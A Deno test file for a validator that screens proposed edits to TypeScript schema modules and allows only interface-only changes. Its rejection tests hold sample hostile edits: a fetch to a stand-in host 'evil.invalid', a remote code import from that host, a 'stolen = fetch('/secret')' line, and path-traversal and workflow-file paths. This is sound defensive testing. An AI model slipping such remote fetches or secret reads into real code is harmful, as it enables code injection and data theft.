import { expect } from "@std/expect";
import {
  assertInterfaceOnly,
  parseProposal,
  proposedSources,
} from "./schema-repair.ts";

const original = `// @yf-schema
import schema from "./example.schema.json" with { type: "json" };
export interface Result {
  [key: string]: unknown;
  count: number;
}
export default function execute() { return schema; }
`;

function proposal(
  before = "  count: number;",
  after = '  count: number;\n  keyVersion?: "v2";',
) {
  return parseProposal(JSON.stringify({
    status: "repair",
    summary: "Accept the observed version while preserving older results.",
    evidence: [
      "example-US.json contains v2; its successful parent fixture omits the field.",
    ],
    edits: [{ path: "src/modules/example.ts", before, after }],
  }));
}

Deno.test("schema repair accepts literal fields and new named data interfaces", () => {
  const repaired = original.replace(
    "  count: number;",
    '  count: number;\n  keyVersion?: "v2";',
  );
  expect(() => assertInterfaceOnly(original, repaired)).not.toThrow();
  expect(() =>
    assertInterfaceOnly(
      original,
      repaired + "\nexport interface Extra { value: string | null; }",
    )
  ).not.toThrow();
});

Deno.test("schema repair rejects runtime, imports, aliases, removed members and altered headers", () => {
  for (
    const after of [
      original.replace(
        "return schema",
        "fetch('https://evil.invalid'); return schema",
      ),
      original.replace("./example.schema.json", "https://evil.invalid/code.ts"),
      original + "\nexport type Dangerous = any;",
      original.replace("  count: number;", ""),
      original.replace("interface Result", "interface Result extends Other"),
      original.replace("export interface Result", "declare interface Result"),
      original.replace("[key: string]: unknown", "[key: string]: any"),
      original.replace(
        "export default function",
        "const stolen = fetch('/secret');\nexport default function",
      ),
    ]
  ) expect(() => assertInterfaceOnly(original, after)).toThrow();
});

Deno.test("schema repair rejects broadening shortcuts, computed properties and schema JSDoc directives", () => {
  for (
    const member of [
      "extra: any;",
      "extra: unknown;",
      "extra: object;",
      "extra: {};",
      "extra: () => void;",
      "extra: typeof execute;",
      "[execute()]: string;",
      "[key: number]: string;",
      "/** @type any */ extra: string;",
      "extra: string; extra: number;",
    ]
  ) {
    const after = original.replace(
      "  count: number;",
      `  count: number;\n  ${member}`,
    );
    expect(() => assertInterfaceOnly(original, after)).toThrow();
  }
});

Deno.test("schema repair applies replacements once and validates the final source before writes", () => {
  const sources = proposedSources(proposal(), () => original);
  expect(sources.get("src/modules/example.ts")).toContain('keyVersion?: "v2"');
  expect(() =>
    proposedSources(proposal("missing", "replacement"), () => original)
  ).toThrow("exactly once");
  expect(() => proposedSources(proposal(), () => original + original)).toThrow(
    "exactly once",
  );
  expect(() =>
    proposedSources(
      proposal("return schema", "return fetch('/secret')"),
      () => original,
    )
  ).toThrow("Runtime");
});

Deno.test("schema repair rejects paths outside module source and invalid handoffs", () => {
  for (
    const path of [
      "../../secret.ts",
      "src/modules/../lib/options.ts",
      ".github/workflows/tests.yaml",
      "src/modules/example.test.ts",
      "src/modules/example.schema.json",
      "src/modules/-evil.ts",
    ]
  ) {
    const p = proposal();
    p.edits[0].path = path;
    expect(() => parseProposal(JSON.stringify(p))).toThrow();
  }
  const p = proposal();
  expect(() => parseProposal(JSON.stringify({ ...p, status: "blocked" })))
    .toThrow();
  expect(() => parseProposal(JSON.stringify({ ...p, extra: "unexpected" })))
    .toThrow();
  expect(() => parseProposal(" ".repeat(256 * 1024 + 1))).toThrow("too large");
  expect(
    parseProposal(JSON.stringify({ ...p, status: "blocked", edits: [] }))
      .status,
  ).toBe("blocked");
});
